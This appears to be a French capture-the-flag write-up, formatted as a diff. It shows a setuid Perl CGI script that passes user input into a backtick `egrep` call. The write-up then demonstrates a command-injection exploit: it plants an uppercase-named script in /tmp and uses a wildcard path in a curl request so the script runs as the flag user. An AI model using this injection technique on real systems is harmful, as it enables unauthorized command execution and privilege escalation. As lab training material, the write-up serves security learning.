@@ -1,0 +1,71 @@
+$ ls -la
+total 16
+dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
+-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
+-r-x------  1 level12 level12  675 Apr  3  2012 .profile
+
+$ cat level12.pl
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+
+on trouve un script perl:
+
+La fonction t convertit la valeur du premier argument en majuscules et supprime tout ce qui suit un espace
+La fonction n n'accepte qu'un seul argument qui est compare. Si le premier argument est 1, elle imprime ... sinon elle imprime . Nous appelons
+la fonction n avec le resultat de la fonction f comme parametre.
+
+Le probleme ici est que le script transforme tout ce que nous passons en majuscules, 
+donc si nous passions la commande suivante $(getflag), 
+il transformerait la chaîne en $(GETFLAG) et la commande ne serait pas executee
+Pour resoudre ce probleme, nous pouvons creer un fichier avec un nom en majuscules, 
+de sorte que même si notre chaîne est transformee en majuscules, elle s'excecutera car le fichier a un nom en majuscules. 
+creons un fichier dans /tmp:
+
+~$ cd /tmp
+/tmp$ vim SAVE_FLAG
+/tmp$ cat SAVE_FLAG
+#!/bin/sh
+
+getflag> /tmp/flag12
+/tmp$ 
+
+
+on peut maintenanty executer $(/tmp/SAVE_FLAG) et enregistrer le flag dans /tmp/flag12
+le dernier probleme et qu on ne peut pas utiliser cette commande car tmp sera transforme en TMP. 
+Pour by pass ca on peut utiliser la wildcard * afin d executer tous les fichier nommes SAVE_FLAG
+
+~$ chmod 777 /tmp/SAVE_FLAG
+~$ curl 'localhost:4646/?x=$(/*/SAVE_FLAG)'
+..
+~$ cat /tmp/flag12
+Check flag.Here is your token : 
